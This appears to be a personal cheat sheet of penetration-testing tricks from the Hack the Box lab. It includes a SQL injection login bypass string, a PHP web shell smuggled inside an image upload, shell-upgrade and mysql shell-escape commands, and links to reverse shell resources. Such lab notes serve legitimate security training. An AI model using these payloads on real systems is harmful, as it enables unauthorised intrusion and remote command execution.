# tricks-htb
Tricks learned while working on the Hack the Box lab.

### Create Python http server to serve files
```bash
python -m SimpleHTTPServer
```

### Bypass login
(magic) Try SQL injection in the login form. Pass this as user and password: `' or 1 = 1--`

### Enumeration
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

### PHP reverse shell
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

### Spawn bash shell using Python
```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```
The press ctrl + z

Then run: `stty raw -echo`

Then write `fg` and press enter (note there's no output of `fg`)

### Reverse shell cheatsheet
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

### Dump traffic on an interface to console
This is useful when blind-exploiting a system, among other situations. Just dump the traffic of an interface to console:
```
tcpdump -i tun0 
```

### Exploit suggester for postexploitation on Metasploit
Use `post/multi/recon/local_exploit_suggester` after a non-admin meterpreter session is created in order to get suggestions on which exploits could be executed next.

### DNS
DNS servers are added to `/etc/resolv.conf`. It may be useful for when the server just accepts requests when host equals to _machineName.htb_. Otherwise the same could be achieved by adding an entry to the file `/etc/hosts`.

### SMB
Use smbmap to enumerate SMB. `smbmap -H $HOST_IP` 

### Redirects
If when intercepting the server responses with a proxy and the `302 Found` response has some content, the HTTP response number and code can be manually changed to, for example, `200 OK` to see the content on the browser instead of following the redirect.

### Abstract shit
- If there are so many things that look the same, check if there's one of them that's different.

### Shell from mysql
Run this from mysql to drop to a shell and see what user you are on:
`\! /bin/sh`

### Injecting php shell in image file
- Upload a proper image with the intercept on
- From the proxy, keep the following code as the "image"'s content: `{{imageMagicBytes}} <?php echo system($_REQUEST['whatever']); ?>`
- Also change the file name and append `.php` (if the image name is image.gif, it would be image.gif.php)
- Access the file from the browser and add `?whatever={{command}}`

### Wordpress
Use `wpscan` to scan Wordpress sites.

### jar files
Jar files can be decompiled to get information from them. First, unzip it using `unzip`, then decompile the unzipped .class file using the program `jad`.

### Do several scans concurrently
Mainly for when there are several services running on the server, but it should be always done that way. After the initial nmap scan has finished, start several scans depending on the case. Eg if port 80 is open, trigger gobuster (with 2 lists, one short and one longer), nikto and maybe an nmap vuln scan.
